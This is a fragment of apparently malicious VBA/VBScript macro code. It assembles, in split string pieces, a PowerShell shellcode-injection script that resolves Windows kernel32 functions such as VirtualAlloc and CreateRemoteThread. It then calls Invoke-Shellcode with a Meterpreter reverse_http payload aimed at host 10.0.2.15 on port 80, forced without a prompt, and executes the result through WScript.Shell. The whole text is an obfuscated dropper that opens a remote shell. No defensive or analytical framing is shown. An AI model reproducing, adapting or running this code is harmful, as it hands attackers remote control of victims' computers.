        Jm = Jm + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        Jm = Jm + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        Jm = Jm + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        Jm = Jm + " CloseHandle
        $CloseHandleDelegate = Get-De"
        Jm = Jm + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        Jm = Jm + "le = [System.Runtime.InteropServices.Marshal]::Get"
        Jm = Jm + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        Jm = Jm + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        Jm = Jm + ".ShouldContinue( 'Do you wish to carry out your ev"
        Jm = Jm + "il plans?',
                 "Injecting shellcode "
        Jm = Jm + "injecting into $((Get-Process -Id $ProcessId).Proc"
        Jm = Jm + "essName) ($ProcessId)!" ) )
        {
            "
        Jm = Jm + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        Jm = Jm + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        Jm = Jm + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        Jm = Jm + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        Jm = Jm + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        Jm = Jm + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        Jm = Jm + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        Jm = Jm + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        Jm = Jm + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        Jm = Jm + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        Jm = Jm + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        Jm = Jm + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        Jm = Jm + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        Jm = Jm + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        Jm = Jm + "rocAddress kernel32.dll CreateThread
        $Crea"
        Jm = Jm + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        Jm = Jm + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        Jm = Jm + "IntPtr])
        $CreateThread = [System.Runtime.I"
        Jm = Jm + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        Jm = Jm + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        Jm = Jm + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        Jm = Jm + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        Jm = Jm + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        Jm = Jm + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        Jm = Jm + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        Jm = Jm + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        Jm = Jm + "ForSingleObjectDelegate)
        if ( $Force -or $"
        Jm = Jm + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        Jm = Jm + " your evil plans?',
                 "Injecting sh"
        Jm = Jm + "ellcode into the running PowerShell process!" ) )
"
        Jm = Jm + "        {
            Inject-LocalShellcode
      "
        Jm = Jm + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        Jm = Jm + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        Jm = Jm + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(Jm)
End Function
